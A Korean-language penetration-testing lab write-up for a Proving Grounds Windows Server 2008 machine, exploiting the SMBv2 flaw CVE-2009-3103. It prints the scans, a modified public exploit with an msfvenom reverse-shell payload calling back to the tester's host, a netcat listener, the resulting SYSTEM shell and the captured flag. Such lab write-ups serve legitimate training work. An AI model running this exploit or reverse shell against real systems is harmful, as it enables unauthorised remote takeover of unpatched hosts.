---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/svc/smb
  - tech/enum/searchsploit
  - tech/payload/msfvenom
  - tech/payload/revshell
type: machine
platform: pg
os: windows
ip: 192.168.248.40
ports: [53, 135, 139, 445, 3389, 5357]
services: [domain, http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
cves: [CVE-2009-3103]
status: solved
manual_tags: true
manual_cves: true
tech_count: 4
---

> [!info] 요약
> 타겟 `192.168.248.40` (2026-08-21 인스턴스) · Windows Server 2008 SP1 (6.0.6001) · PG Fundamental · 플래그 1개
> 진입점: MS09-050 / CVE-2009-3103 — `srv2.sys` SMBv2 negotiate 원격 커널 RCE. 공개 PoC(EDB 40280)를 수동 손질해 `msfvenom` 리버스셸로 교체, 진입 즉시 `NT AUTHORITY\SYSTEM`
> 권한상승: 불필요 — 커널 RCE 라 진입 자체가 SYSTEM
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.40

### Initial Access – SMBv2 NEGOTIATE 커널 결함(CVE-2009-3103)을 수동 손질한 공개 PoC 로 트리거해 무인증 원격 SYSTEM 획득

**Vulnerability Explanation:**
- `srv2.sys`(SMBv2 커널 드라이버)의 SMB2 NEGOTIATE 요청 처리 결함 — `Process ID High` 필드에 `&`(0x26)를 넣으면 방언 배열 인덱싱에서 범위 밖 메모리를 역참조(array index error)
- 인증 불필요. 커널 모드에서 실행되므로 성공 시 컨텍스트가 곧 `NT AUTHORITY\SYSTEM`. 실패하면 BSOD(시스템 크래시)
- 메모리 손상 익스플로잇이라 성공/크래시가 확률적 — 이 인스턴스는 실패 시 자동으로 BSOD → 재부팅(~90초) → `srv2.sys` 재생 사이클을 보였음(`Privilege Escalation` 절 아래 근거)

**Vulnerability Fix:**
- MS09-050 패치(2009) 적용 또는 취약 세대 OS(2008 SP1/Vista) 폐기 — 이 인스턴스는 `Hotfix(s): N/A`(패치 전무)
- 445/139 를 인터넷·비신뢰 세그먼트에 노출 금지. 레거시가 불가피하면 SMBv1 비활성화 + 최신 방언 강제, 호스트 방화벽으로 SMB 관리망만 허용

**Severity:** Critical — 무인증 원격 커널 RCE, 진입 즉시 SYSTEM

**Steps to reproduce the attack:**
1. `nmap --script smb-vuln-cve2009-3103` 로 CVE-2009-3103 취약 확정
2. EDB 40280(`ohnozzy/Exploit MS09_050.py`)의 shellcode 를 `msfvenom windows/shell_reverse_tcp` 출력(324B)으로 교체, NetBIOS 선언 길이(0x39e)에 맞춰 원본 길이(354B)까지 NOP 패딩
3. `nc -lvnp 443` 리스너 대기
4. 패치본을 445 에 발사 → `rpcclient` 인증 시도가 후킹된 코드를 트리거 → 콜백
5. 콜백 즉시 stdin 사전 주입으로 `type proof.txt` 자동 실행 — 커널 익스플로잇은 재시도 시 `srv2.sys` 를 죽이므로 첫 셸에서 바로 회수해야 함([[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]])

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.40 | TCP: 53, 135, 139, 445, 3389, 5357 |

```text
# Nmap 7.98 scan initiated Fri Aug 21 00:52:48 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.40
Warning: 192.168.248.40 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.248.40
Host is up (0.084s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open     ms-wbt-server Microsoft Terminal Service
5357/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open     unknown
49153/tcp open     unknown
49154/tcp open     unknown
49155/tcp open     unknown
49156/tcp open     unknown
49157/tcp open     unknown
49158/tcp open     unknown
53173/tcp filtered unknown
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2
```
— 출처: `~/PG/Internal/nmap.log`(전 포트, 144초. OS 지문·TRACEROUTE 절은 생략). `49152–49158` 은 동적 RPC(부팅마다 변동, 색인 제외 대상). `53173/tcp filtered` 는 이 스캔의 단발 blip — 재스캔 미시도[관측 없음], 445 경로에 집중.

`6.0.6001` = Windows Server 2008 SP1(빌드 6001). 이 빌드대가 SMBv2 초기 세대라 `srv2.sys` 결함(CVE-2009-3103)의 대상.

**버전 판정 — 독립 근거 2개**

근거① 위 `-sCV` 스캔의 **53/tcp DNS 배너** — `Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)`. SMB 와 무관한 별개 서비스가 같은 빌드를 밝힘.
근거② 별도 스크립트 스캔의 `smb-os-discovery` — 아래.

```text
# nmap -Pn -p445 --script smb-vuln-cve2009-3103,smb-os-discovery,smb-protocols 192.168.248.40
Host script results:
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|_    2.0.2
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-20T08:53:58-07:00
| smb-vuln-cve2009-3103:
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
```
— 출처: `~/PG/Internal/nmap_smbvuln.log`. `smb-os-discovery` 배너("2008 Standard 6001 SP1")가 근거②.

`smb-protocols` 의 dialects 목록은 버전 근거가 아니라 **취약성의 전제**임 — SMBv1(`NT LM 0.12`)과 SMBv2(`2.0.2`)가 둘 다 정상 협상돼야 PoC 가 SMBv1 negotiate 에 `SMB 2.002` 방언을 실어 `srv2.sys` 핸들러로 밀어넣을 수 있음. 이 `2.0.2` 줄을 `Privilege Escalation` 절에서 다시 인용함 — 이후 사라지는 것이 `srv2.sys` 가 죽었다는 증거.

**그 밖의 엔드포인트**
- 5357/tcp — WSDAPI(`Microsoft-HTTPAPI/2.0`), `Service Unavailable` 만 반환. 웹 UI 아님
- 3389(RDP) — 인증 정보 없어 진입로 불가
- 49152–49158 — Windows 동적 RPC(부팅마다 변동)

경로는 445 SMBv2 커널 RCE 하나로 좁혀짐. 볼트 `파일보관\` 에 이 박스 스크린샷은 없음[관측 없음] — 웹 UI 가 없어 대상 화면 자체가 없었고 원격 셸은 SSH 로 헤드리스로만 다뤄짐.

### Initial Access – MS09-050 SMBv2 커널 RCE 재현

공개 PoC(EDB 40280, `searchsploit ms09-050` → `windows/remote/40280.py`)를 그대로 실행하지 않고 먼저 읽었음. 핵심 구조:
- `buff` 는 손으로 짠 SMBv1 헤더(`\xffSMB`, 명령 0x72=Negotiate)에 `"SMB 2.002"` 방언 문자열을 실어 SMBv2 negotiate 핸들러로 밀어 넣음. `\x17\x02`(high process ID)·`\xb4\xff\xff\x3f`(magic index)·`\x09\x0d\xd0\xff`(return address)가 취약 인덱스를 겨눔
- metasploit 의 `stager_sysenter_hook` 이 뒤따름 — `sysenter` 를 후킹해 유저 프로세스가 syscall 할 때 shellcode 를 복사·실행. 스테이저는 `0x216`(534) 바이트를 복사
- 마지막에 `subprocess.call("... rpcclient -U Administrator <target>")` — 인증 이벤트로 후킹된 코드를 트리거. 인증 성공 여부는 무관

원본 PoC 결함 둘: ① shellcode 가 옛 LHOST(meterpreter) 하드코딩 → 교체 필요. ② `from smb.SMBConnection import SMBConnection` — 이 Kali python2 에 `pysmb` 없어(`ImportError`) 즉사. 실제로 안 쓰는 import 라 수정본에서 삭제 — 트리거는 `subprocess` 로 `rpcclient` 를 직접 부르므로 불필요.

**길이 제약 — 조용한 실패의 원인.** `buff` 맨 앞 NetBIOS 세션 길이 필드가 `\x00\x00\x03\x9e`(0x39e=926)로 고정. 원본 shellcode 는 354바이트인데 `msfvenom` 출력은 324바이트 — 30바이트 짧아 그대로 보내면 선언 길이만큼 안 채워진 패킷이 되어 **취약 코드 경로까지 도달은 하지만 트리거가 조용히 실패**함(콜백 없음). NOP(`\x90`)로 354까지 패딩하자 곧바로 셸이 붙었음. pcap 으로 재보면 패딩 전 injection 은 TCP length 900(SMB 본문 896B, 선언값보다 30B 부족), 패딩 후는 930(본문 926B = `0x39e` 와 일치) — 콜백은 930B 발사에서만 확인됨.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.207 LPORT=443 EXITFUNC=thread -f python -v shell
```
```text
[-] No arch selected, selecting arch: x86 from the payload
Payload size: 324 bytes
```
— 출처: `~/PG/Internal/msfvenom_shellcode.txt`. `msfvenom` 은 페이로드 생성기라 전 대상 허용(시험 규정) — `msfconsole`/`meterpreter` 는 쓰지 않음.

수정본 `~/PG/Internal/exploits/ms09_050_revshell_pad.py` 의 패딩 라인:
```python
shell += "\x90"*(354-len(shell))  # pad so packet length matches declared NetBIOS len 0x39e
buff+=shell
```

리스너(tmux 안, 443):
```bash
sudo nc -lvnp 443
```
아웃바운드 443 은 정상 — tcpdump 로 connect-back SYN 확인(아래). 포트 교체(80/53) 불필요.

발사:
```text
# python2 exploits/ms09_050_revshell_pad.py 192.168.248.40
Password for [WORKGROUP\Administrator]:
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
[*] shellcode len = 354 (stager copies 0x216 = 534)
[*] injecting into 192.168.248.40:445
[*] triggering via rpcclient auth attempt
[*] done
```
— 출처: `~/PG/Internal/try3_ms09050_padded.log`. `NT_STATUS_LOGON_FAILURE` 는 정상 — `rpcclient` 가 인증에 실패해도 그 시도 자체가 후킹된 코드를 트리거함.

`tcpdump -i tun0` 를 계속 걸어둔 채 확인한 실제 패킷(try2.pcap, 이 캡처는 패딩 전 실패 발사와 뒤이은 패딩본 성공 콜백을 모두 담고 있음):
```text
00:56:05.243188 IP 192.168.45.207.38106 > 192.168.248.40.445: Flags [P.], seq 1:901, ..., length 900   ← 패딩 전, 콜백 없음
00:57:33.497313 IP 192.168.45.207.56398 > 192.168.248.40.445: Flags [P.], seq 1:931, ..., length 930   ← 패딩 후
00:57:33.867319 IP 192.168.248.40.49159 > 192.168.45.207.443: Flags [S], ...                            ← 콜백 SYN, 930B 발사 직후
```
— 출처: `~/PG/Internal/try2.pcap`(`sudo tcpdump -nn -r try2.pcap`)

리스너에 붙은 것:
```text
listening on [any] 443 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.40] 49159
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
— 출처: `~/PG/Internal/listener_443.log`. `nc` 로 받은 **대화형 `cmd.exe` 세션 캡처**(웹셸 아님) — 프롬프트가 타겟이 보낸 실측 바이트임. Windows `cmd` 라 유닉스 pty 는 개입하지 않음. 컨텍스트는 `whoami` 로 확인 — `nt authority\system`.

이 셸은 수 초 만에 죽는 경우가 잦아(호스트가 불안정) 대화형으로 명령을 왕복시키지 않고 리스너 stdin 을 미리 채워 콜백 즉시 자동 실행되게 함([[_PLAYBOOK#A-34. 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다]] 참조). 실제 회수 화면과 값은 `Post-Exploitation` 절.

**Local.txt value:** 없음 — 이 박스는 진입 즉시 SYSTEM 이라 별도 user 플래그가 없음. `dir /b /s C:\Users\proof.txt` 전수 탐색 결과 `C:\Users\Administrator\Desktop\proof.txt` 단일 파일만 확인됨(PG 단일 플래그 표준 위치, 슬롯 1개).

### Privilege Escalation – 불필요 (커널 RCE 로 진입 자체가 SYSTEM)

**Vulnerability Explanation:** 별도 권한상승 취약점 없음. MS09-050 이 **커널 모드** RCE 라 페이로드가 커널 컨텍스트에서 실행되고, 콜백 시점의 셸이 이미 `nt authority\system`(`listener_443.log` 직후 `whoami` 로 확인).

**Vulnerability Fix:** 해당 없음 — `Initial Access` 의 Fix(MS09-050 패치 / 취약 세대 OS 폐기)가 이 항목도 함께 닫음.

**Severity:** 해당 없음 — 심각도는 `Initial Access` 에 계상(Critical).

**Steps to reproduce the attack:** 해당 없음 — 추가 단계 없이 최초 셸이 SYSTEM. 아래 열거는 확인·학습용.

`harvest.ps1` 을 돌리려 했으나 이 호스트에는 **PowerShell 이 설치돼 있지 않음.** Server 2008(비-R2)은 PowerShell 이 기본 미포함(선택 기능)이라 `dir C:\Windows\System32\WindowsPowerShell` 이 `File Not Found`. cmd 내장 명령으로 대체 열거(리스너 stdin 사전 주입 방식, `~/PG/Internal/harvest_admin.txt` 234행):

```text
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>whoami /all
...
Privilege Name                  Description                                   State
=============================== ============================================= ========
SeCreateTokenPrivilege          Create a token object                         Enabled
...
SeTcbPrivilege                  Act as part of the operating system           Enabled
...
SeDebugPrivilege                Debug programs                                Enabled
...
SeImpersonatePrivilege          Impersonate a client after authentication     Enabled
...

C:\Windows\system32>net user

User accounts for \\

-------------------------------------------------------------------------------
aaron                    Administrator            Guest
jack                     niky                     tim
The command completed with one or more errors.

C:\Windows\system32>systeminfo
OS Version:                6.0.6001 Service Pack 1 Build 6001
Hotfix(s):                 N/A
```
— 출처: `~/PG/Internal/harvest_admin.txt`(발췌). `Hotfix(s): N/A` 가 MS09-050 이 통한 이유를 설명함 — 이 호스트는 핫픽스가 전무. 이미 SYSTEM 이라 `SeCreateToken`·`SeTcb`·`SeImpersonate`·`SeDebug` 등은 쓸 데가 없음. `net user` 의 로컬 계정 6개는 이 박스가 단일 플래그라 추가 회수 대상 아님.

**이 인스턴스가 재시도-내성인 이유(근거)**: 실패한 발사마다 대상이 BSOD 후 자동 재부팅(~90초)해 `srv2.sys`/SMBv2 를 되살렸음. `smb2-capabilities`·`smb-protocols` 로 재생 여부를 판정.

반복 발사 직후 — SMBv2 사망:
```text
Host script results:
|_smb2-capabilities: SMB 2+ not supported
```
— 출처: `~/PG/Internal/smb2_recheck.log`(01:36)

재부팅 뒤 — SMBv2 재생:
```text
Host script results:
| smb2-capabilities: 
|   2.0.2: 
|_    Distributed File System
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|_    2.0.2
```
— 출처: `~/PG/Internal/smb_postrevert2.log`(01:54)

`srv.sys`(SMBv1)는 안 죽어 445 응답 자체는 살아 있으므로 **「복구됐다」로 오판하기 쉬움** — SMBv2 생사는 위처럼 따로 물어야 함. 상세 시행착오(SMBv2 wedge·revert 미반영 검산·트리거 별도 고장)는 [[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]] · [[_PLAYBOOK#A-46. 다단계 익스플로잇은 각 단계를 «따로» 검증한다]] 로 이관.

### Post-Exploitation

**Proof.txt value:** `f4afb9b13d59235cb9c8892707256f7d`

```text
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
f4afb9b13d59235cb9c8892707256f7d

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>hostname
internal

C:\Windows\system32>whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
nt authority\system
internal
   IPv4 Address. . . . . . . . . . . : 192.168.248.40
Thu 08/20/2026 
10:03 AM
f4afb9b13d59235cb9c8892707256f7d

C:\Windows\system32>dir /b /s C:\Users\proof.txt
C:\Users\Administrator\Desktop\proof.txt

C:\Windows\system32>
```
— 출처: `~/PG/Internal/flag_evidence.txt`. 대화형 `cmd.exe`(웹셸 아님)에서 `type` 으로 읽음 — OSCP 인정 형식. 타겟 시간대는 UTC-7(PDT) — `date /t` 의 `08/20/2026` 은 Kali/KST(UTC+9) 기준 08/21 새벽 02:03 과 같은 순간(`smb-os-discovery` 의 `System time … -07:00` 으로 확인). 자기모순 아님, 타임존 차이.

**남긴 흔적**
- 타겟에 파일 업로드·계정 생성·설정 변경 없음. 리버스셸만 잡음. (harvest 를 위해 `powershell ... DownloadFile` 로 `C:\Windows\Temp\h.ps1` 을 받으려 했으나 PowerShell 부재로 실패 — 파일은 생성되지 않음)
- BSOD·자동 재부팅 — 실패한 발사와 성공 셸의 종료로 타겟이 여러 번 재부팅됨. 이 박스의 정상 동작(`Privilege Escalation` 절 참조). 정리 시점에 박스는 살아 있었음(`445 open`)
- 커널 후킹(`sysenter` hook)의 잔존 여부는 확인하지 않음[관측 없음] — 셸이 짧게 죽어 점검 불가. 재부팅마다 초기화됨
- Kali 측 정리 확인함 — 만든 tmux 세션(`int_*`) 전부 종료, 띄운 `sudo nc` 리스너 전부 **PID 특정 kill**, `python http.server` 종료, 443/80 에 잔존 프로세스 없음. **같은 Kali 에 공존한 다른 타겟(192.168.248.220)의 nc(pid 373831–373838)는 건드리지 않음** — PID 특정 정리 덕분. 로그·pcap·스크립트 전량 보존(`try1`~`try31`, pcap 2개, `listener_*.sh`, `attempt_loop.sh`). 지운 것 없음
— 출처: `~/PG/Internal/traces_confirmed.log`

## 관련

- CVE-2009-3103 / MS09-050 / Microsoft Security Advisory 975497
- EDB 40280(`windows/remote/40280.py`, ohnozzy `MS09_050.py`) — 이 노트의 PoC 원본. 검증된 수정본: `~/PG/Internal/exploits/ms09_050_revshell_pad.py`
- [[_PLAYBOOK#A-34. 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다]] · [[_PLAYBOOK#A-46. 다단계 익스플로잇은 각 단계를 «따로» 검증한다]] · [[_PLAYBOOK#B-24. 커널 익스플로잇은 «한 발»이다 — 재시도가 스스로 문을 닫는다]]
